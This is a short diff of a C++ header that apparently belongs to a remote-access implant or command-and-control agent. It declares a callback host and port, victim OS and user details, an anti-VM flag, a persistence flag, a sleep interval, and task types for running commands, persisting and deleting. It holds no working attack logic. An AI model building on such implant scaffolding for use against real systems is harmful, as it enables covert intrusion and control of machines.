@@ -11,16 +11,16 @@ using namespace nlohmann;
 extern std::string host;
 extern std::string port;
 extern int version; //change to 20?
-//change to struct or seperate variables. should only parse incoming json
-extern json listener_json; //going to be a problem with the template script
+
+extern json listener_json;
 
 //Vars
 //static client id
-extern std::string client_id;//replace with generated uuid or read from persistence
+extern std::string client_id;
 //project id
-extern int project_id;//replace
+extern std::string project_id;
 //expiration date
-extern std::string expiration_date; //replace
+extern std::string expiration_date; 
 //os name
 extern std::string os_name;
 //user name
@@ -39,7 +39,8 @@ extern json log_array;
 extern std::string log_output;
 //settings
 extern bool NO_VM;
-extern bool PERSIST_ON;//for testing purposes
+extern bool PERSIST_ON;
+extern int sleep_time;
 //enums
 enum TASK_STATUS { NOTASK, TASK, CONNERROR };
 enum TASK_TYPE {COMMAND, CONFIG, PERSIST, PING, SHUTDOWN, DELETE};
